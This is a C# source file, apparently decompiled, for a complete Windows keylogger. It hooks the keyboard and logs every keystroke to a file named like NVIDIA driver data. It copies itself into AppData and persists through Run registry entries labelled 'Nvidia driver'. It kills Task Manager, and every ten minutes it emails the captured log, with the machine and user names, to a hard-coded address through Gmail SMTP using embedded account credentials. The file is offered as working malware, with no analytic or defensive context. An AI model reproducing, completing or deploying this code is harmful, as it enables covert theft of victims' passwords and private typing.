using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace project;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	public static byte counter = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static void Main()
	{
		if (failed == 0)
		{
			File.WriteAllText(path, "");
		}
		_hookID = SetHook(_proc);
		startup();
		Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11003@gmail.com", "pakistan00");
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 600000.0;
		timer.Start();
		Application.Run();
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	public static void startup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string text2 = text;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "nvdisp.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", folderPath);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (text != text2)
		{
			Process.Start(text);
			Environment.Exit(0);
		}
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Taskmgr.exe"))
			{
				process.Kill();
			}
		}
		counter++;
		Mail("shah_sahab_jhoolalal@hotmail.co.uk", "imran.nazir11002@gmail.com", "pakistan00");
	}

	public static void Mail(string x, string y, string z)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add(x);
		mailMessage.From = new MailAddress(y);
		mailMessage.Subject = Environment.MachineName + "--" + counter + "--" + Environment.UserName;
		mailMessage.SubjectEncoding = Encoding.UTF8;
		if (counter == 0)
		{
			mailMessage.Body = "Welcome 2 Pan Yaki...." + Environment.MachineName + "----" + Environment.UserName + "---- is online";
		}
		else
		{
			mailMessage.Body = "Welcome 2 Pan Yaki....";
		}
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.Normal;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential(y, z);
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment attachment = new Attachment(path);
		if (counter != 0)
		{
			mailMessage.Attachments.Add(attachment);
		}
		try
		{
			smtpClient.Send(mailMessage);
		}
		catch
		{
			attachment.Dispose();
		}
		attachment.Dispose();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between I4 and Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected I4, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected I4, but got Unknown
		//IL_0435: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c6: Expected I4, but got Unknown
		//IL_04c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e3: Expected I4, but got Unknown
		//IL_04e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ea: Invalid comparison between Unknown and I4
		StreamWriter streamWriter;
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			streamWriter = File.AppendText(path);
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 93)
			{
				switch (val - 8)
				{
				case 0:
					goto IL_0140;
				case 1:
					goto IL_0150;
				case 5:
					goto IL_0160;
				case 11:
					goto IL_0170;
				case 12:
					goto IL_0180;
				case 19:
					goto IL_01a3;
				case 24:
					goto IL_01b3;
				case 25:
					goto IL_01c3;
				case 26:
					goto IL_01d3;
				case 27:
					goto IL_01e3;
				case 28:
					goto IL_01f3;
				case 29:
					goto IL_0203;
				case 30:
					goto IL_0213;
				case 31:
					goto IL_0223;
				case 32:
					goto IL_0233;
				case 34:
					goto IL_0243;
				case 36:
					goto IL_0253;
				case 37:
					goto IL_0263;
				case 40:
					goto IL_0273;
				case 41:
					goto IL_02a0;
				case 42:
					goto IL_02cd;
				case 43:
					goto IL_02fa;
				case 44:
					goto IL_0327;
				case 45:
					goto IL_0354;
				case 46:
					goto IL_0381;
				case 47:
					goto IL_03ae;
				case 48:
					goto IL_03db;
				case 49:
					goto IL_0408;
				case 2:
				case 3:
				case 4:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 13:
				case 14:
				case 15:
				case 16:
				case 17:
				case 18:
				case 20:
				case 21:
				case 22:
				case 23:
				case 33:
				case 35:
				case 38:
				case 39:
					goto IL_0615;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					break;
				default:
					goto IL_0615;
				}
				goto IL_0595;
			}
			switch (val - 160)
			{
			case 0:
			case 1:
			case 2:
			case 3:
			case 4:
			case 5:
				goto IL_0595;
			case 13:
				goto IL_05a5;
			case 14:
				goto IL_05b5;
			case 15:
				goto IL_05c5;
			case 16:
				goto IL_05d5;
			case 17:
				goto IL_05e5;
			case 18:
				goto IL_05f5;
			case 19:
				goto IL_0605;
			case 6:
			case 7:
			case 8:
			case 9:
			case 10:
			case 11:
			case 12:
			case 20:
			case 21:
			case 22:
			case 23:
			case 24:
			case 25:
				goto IL_0615;
			case 26:
				goto IL_06d3;
			case 27:
				goto IL_0700;
			case 28:
				goto IL_072d;
			case 29:
				goto IL_075a;
			case 30:
				goto IL_0784;
			case 31:
				goto IL_07ab;
			case 32:
				goto IL_07d2;
			}
			switch (val - 219)
			{
			case 0:
				goto IL_0501;
			case 1:
				goto IL_052e;
			case 2:
				goto IL_053e;
			case 3:
				goto IL_056b;
			}
			if ((int)val != 262144)
			{
				goto IL_0615;
			}
			streamWriter.Write("[alt]");
			goto IL_07f7;
		}
		goto IL_0803;
		IL_0605:
		streamWriter.Write("[media_play/pause]");
		goto IL_07f7;
		IL_0170:
		streamWriter.Write("[pause]");
		goto IL_07f7;
		IL_0150:
		streamWriter.Write("[tab]");
		goto IL_07f7;
		IL_0160:
		streamWriter.WriteLine("");
		goto IL_07f7;
		IL_0140:
		streamWriter.Write("[bs]");
		goto IL_07f7;
		IL_0408:
		if (shift == 0)
		{
			streamWriter.Write("9");
		}
		else
		{
			streamWriter.Write("(");
		}
		goto IL_07f7;
		IL_07d2:
		if (shift == 0)
		{
			streamWriter.Write("`");
		}
		else
		{
			streamWriter.Write("~");
		}
		goto IL_07f7;
		IL_05c5:
		streamWriter.Write("[vol_up]");
		goto IL_07f7;
		IL_03db:
		if (shift == 0)
		{
			streamWriter.Write("8");
		}
		else
		{
			streamWriter.Write("*");
		}
		goto IL_07f7;
		IL_05b5:
		streamWriter.Write("[vol_down]");
		goto IL_07f7;
		IL_07ab:
		if (shift == 0)
		{
			streamWriter.Write("/");
		}
		else
		{
			streamWriter.Write("?");
		}
		goto IL_07f7;
		IL_03ae:
		if (shift == 0)
		{
			streamWriter.Write("7");
		}
		else
		{
			streamWriter.Write("&");
		}
		goto IL_07f7;
		IL_053e:
		if (shift == 0)
		{
			streamWriter.Write("]");
		}
		else
		{
			streamWriter.Write("}");
		}
		goto IL_07f7;
		IL_05a5:
		streamWriter.Write("[vol_mute]");
		goto IL_07f7;
		IL_0381:
		if (shift == 0)
		{
			streamWriter.Write("6");
		}
		else
		{
			streamWriter.Write("^");
		}
		goto IL_07f7;
		IL_0784:
		if (shift == 0)
		{
			streamWriter.Write(".");
		}
		else
		{
			streamWriter.Write(">");
		}
		goto IL_07f7;
		IL_0595:
		streamWriter.Write("");
		goto IL_07f7;
		IL_0354:
		if (shift == 0)
		{
			streamWriter.Write("5");
		}
		else
		{
			streamWriter.Write("%");
		}
		goto IL_07f7;
		IL_052e:
		streamWriter.Write("|");
		goto IL_07f7;
		IL_075a:
		if (shift == 0)
		{
			streamWriter.Write("-");
		}
		else
		{
			streamWriter.Write("_");
		}
		goto IL_07f7;
		IL_0327:
		if (shift == 0)
		{
			streamWriter.Write("4");
		}
		else
		{
			streamWriter.Write("$");
		}
		goto IL_07f7;
		IL_0501:
		if (shift == 0)
		{
			streamWriter.Write("[");
		}
		else
		{
			streamWriter.Write("{");
		}
		goto IL_07f7;
		IL_05f5:
		streamWriter.Write("[media_stop]");
		goto IL_07f7;
		IL_02fa:
		if (shift == 0)
		{
			streamWriter.Write("3");
		}
		else
		{
			streamWriter.Write("#");
		}
		goto IL_07f7;
		IL_072d:
		if (shift == 0)
		{
			streamWriter.Write(",");
		}
		else
		{
			streamWriter.Write("<");
		}
		goto IL_07f7;
		IL_056b:
		if (shift == 0)
		{
			streamWriter.Write("'");
		}
		else
		{
			streamWriter.Write('"');
		}
		goto IL_07f7;
		IL_02cd:
		if (shift == 0)
		{
			streamWriter.Write("2");
		}
		else
		{
			streamWriter.Write("@");
		}
		goto IL_07f7;
		IL_05e5:
		streamWriter.Write("[media_prev]");
		goto IL_07f7;
		IL_0700:
		if (shift == 0)
		{
			streamWriter.Write("=");
		}
		else
		{
			streamWriter.Write("+");
		}
		goto IL_07f7;
		IL_02a0:
		if (shift == 0)
		{
			streamWriter.Write("1");
		}
		else
		{
			streamWriter.Write("!");
		}
		goto IL_07f7;
		IL_0615:
		if (shift == 0 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		if (shift == 1 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 0 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 1 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		goto IL_07f7;
		IL_07f7:
		shift = 0;
		streamWriter.Close();
		goto IL_0803;
		IL_0273:
		if (shift == 0)
		{
			streamWriter.Write("0");
		}
		else
		{
			streamWriter.Write(")");
		}
		goto IL_07f7;
		IL_06d3:
		if (shift == 0)
		{
			streamWriter.Write(";");
		}
		else
		{
			streamWriter.Write(":");
		}
		goto IL_07f7;
		IL_0803:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_0263:
		streamWriter.Write("[insert]");
		goto IL_07f7;
		IL_0253:
		streamWriter.Write("[prnt_scrn]");
		goto IL_07f7;
		IL_0243:
		streamWriter.Write("[print]");
		goto IL_07f7;
		IL_0233:
		streamWriter.Write("[down]");
		goto IL_07f7;
		IL_0223:
		streamWriter.Write("[right]");
		goto IL_07f7;
		IL_0213:
		streamWriter.Write("[up]");
		goto IL_07f7;
		IL_0203:
		streamWriter.Write("[left]");
		goto IL_07f7;
		IL_01f3:
		streamWriter.Write("[home]");
		goto IL_07f7;
		IL_01e3:
		streamWriter.Write("[end]");
		goto IL_07f7;
		IL_01d3:
		streamWriter.Write("[p_down]");
		goto IL_07f7;
		IL_01c3:
		streamWriter.Write("[p_up]");
		goto IL_07f7;
		IL_01b3:
		streamWriter.Write("[sb]");
		goto IL_07f7;
		IL_01a3:
		streamWriter.Write("[esc]");
		goto IL_07f7;
		IL_0180:
		if (caps == 0)
		{
			caps = 1;
		}
		else
		{
			caps = 0;
		}
		goto IL_07f7;
		IL_05d5:
		streamWriter.Write("[media_next]");
		goto IL_07f7;
	}
}
